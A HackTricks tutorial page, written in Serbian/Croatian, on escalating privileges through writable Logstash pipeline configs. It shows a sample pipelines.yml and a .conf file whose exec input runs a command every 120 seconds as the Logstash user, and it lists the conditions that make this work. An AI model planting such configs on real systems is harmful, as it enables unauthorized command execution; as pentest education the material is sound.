{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


## Logstash

Logstash se koristi za **prikupljanje, transformaciju i slanje logova** kroz sistem poznat kao **pipelines**. Ove pipelines se sastoje od **input**, **filter** i **output** faza. Zanimljiv aspekt se javlja kada Logstash radi na kompromitovanoj mašini.

### Pipeline Configuration

Pipelines se konfigurišu u datoteci **/etc/logstash/pipelines.yml**, koja navodi lokacije konfiguracija pipelines:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Ovaj fajl otkriva gde se nalaze **.conf** fajlovi, koji sadrže konfiguracije pipeline-a. Kada se koristi **Elasticsearch output module**, uobičajeno je da **pipelines** uključuju **Elasticsearch credentials**, koje često imaju opsežne privilegije zbog potrebe Logstash-a da piše podatke u Elasticsearch. Wildcard-ovi u konfiguracionim putanjama omogućavaju Logstash-u da izvrši sve odgovarajuće pipeline-ove u određenom direktorijumu.

### Eskalacija privilegija putem zapisivih pipeline-a

Da biste pokušali eskalaciju privilegija, prvo identifikujte korisnika pod kojim Logstash servis radi, obično korisnika **logstash**. Uverite se da ispunjavate **jedan** od ovih kriterijuma:

- Imate **pristup za pisanje** u **.conf** fajl pipeline-a **ili**
- **/etc/logstash/pipelines.yml** fajl koristi wildcard, i možete pisati u ciljni folder

Pored toga, **jedan** od ovih uslova mora biti ispunjen:

- Mogućnost ponovnog pokretanja Logstash servisa **ili**
- **/etc/logstash/logstash.yml** fajl ima **config.reload.automatic: true** postavljeno

S obzirom na wildcard u konfiguraciji, kreiranje fajla koji odgovara ovom wildcard-u omogućava izvršavanje komandi. Na primer:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Ovde, **interval** određuje učestalost izvršavanja u sekundama. U datom primeru, **whoami** komanda se izvršava svake 120 sekundi, a njen izlaz se usmerava u **/tmp/output.log**.

Sa **config.reload.automatic: true** u **/etc/logstash/logstash.yml**, Logstash će automatski otkriti i primeniti nove ili izmenjene konfiguracije cevi bez potrebe za ponovnim pokretanjem. Ako nema džokera, izmene se i dalje mogu praviti na postojećim konfiguracijama, ali se savetuje oprez kako bi se izbegle smetnje.


## References
{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
